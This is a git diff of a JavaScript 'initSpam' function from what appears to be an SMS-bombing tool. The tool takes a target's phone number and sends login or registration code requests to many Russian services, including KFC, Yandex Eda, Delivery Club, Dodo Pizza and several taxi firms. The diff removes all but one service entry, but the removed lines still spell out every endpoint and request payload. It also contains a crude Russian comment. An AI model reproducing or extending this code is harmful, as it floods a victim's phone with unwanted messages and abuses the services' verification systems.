@@ -42,23 +42,7 @@ function initSpam() {
 		if (!app.status ) { //ТУТ ДОХУЯ УСЛОВИЙ НА ПРОВЕРКУ НАДА ДЕДУ
 			phone = "+" + document.getElementById("numberForm").value;
 			servicesBase = [
-				{ name:"PIZZAPROSTO", req:"post", url:"https://api.pizza-prosto.ru/P_login_sms", type:"urlencoded", data:{'action':'registration','phone':phone.replace("+7","")} },
-				{ name:"AVTODISP", req:"get", url:"https://vse-taxi.com/sms-confirm-send.aspx?phone="+phone, type:"urlencoded", data:{'phone': phone} },
-				{ name:"FIXPRICE", req:"post", url:"https://fix-price.ru/ajax/register_phone_code.php", type:"urlencoded", data:{"register_call": "Y", "action": "getCode", "phone": phone} },
-				{ name:"URAMOBIL", req:"post", url:"https://service.uramobil.ru/profile/smstoken", type:"json", data:{"PhoneNumber":phone.replace("+7","7")} },
-				{ name:"VIASAT", req:"post", url:"https://api-production.viasat.ru/api/v1/auth_codes", type:"json", data:{"msisdn":phone} },
-				{ name:"SUNLIGHT", req:"post", url:"https://api.sunlight.net/v3/customers/authorization/", type:"json", data:{"phone":phone} },
-				{ name:"TAXI1331", req:"post", url:"https://1331.ru/api/register/?", type:"json", data:{"phone":phone,"office_id":"1"} },
-				{ name:"WELNY", req:"post", url:"https://welny.ru/api/users", type:"json", data:{"jsonrpc":"2.0", "id":"1", "lang":"ru", "method":"login_init", "params":{"phone": phone}} },
-				{ name:"KFC", req:"post", url:"https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", type:"json", data:{"phone":phone} },
-				{ name:"SAMARATAXI", req:"post", url:"https://samarataxi.ru/an_site/new_create_order/json_requestpin.php?type=request&phone={}&_=1551301699484".replace("{}",phone.replace("+7","8")), type:"json", data:{} }, //ПРОВЕРИТЬ
-				{ name:"BURGERKING", req:"post", url:"https://1869.smartomato.ru/account/session", type:"json", data:{"phone":phone, "g-recaptcha-response":"null"} },
-				{ name:"YANDEXEDA", req:"post", url:"https://eda.yandex/api/v1/user/request_authentication_code", type:"json", data:{"phone_number":phone.replace("+7","")} },
-				{ name:"DELIVERYCLUB", req:"post", url:"https://www.delivery-club.ru/ajax/user_otp", type:"urlencoded", data:{"phone":phone.replace("+7","7")} },
-				{ name:"RADUGAVKUSA", req:"post", url:"https://cheboksari.rvkusa.com/ajax/registration", type:"urlencoded", data:{"phone":phone,"step":"1"} },
-				{ name:"DODOPIZZA", req:"post", url:"https://dodopizza.ru/api/sendconfirmationcode", type:"urlencoded", data:{"phoneNumber":phone.replace("+7","7")} },
-				{ name:"PANPIZZA", req:"post", url:"https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode", type:"urlencoded", data:{"telephone":phone.replace("+7","8")} },
-				{ name:"MSTAXI", req:"post", url:"http://www.taxi-ms.ru/ajax.php", type:"urlencoded", data:{"action": "request.call", "phone": beauty(phone), "siteId": "uf"} }
+				{ name:"PIZZAPROSTO", req:"post", url:"https://api.pizza-prosto.ru/P_login_sms", type:"urlencoded", data:{'action':'registration','phone':phone.replace("+7","")} }
 			];
 			document.getElementById("startButton").innerHTML = "Остановить";
 			statusAlert.innerHTML = "Enabled";
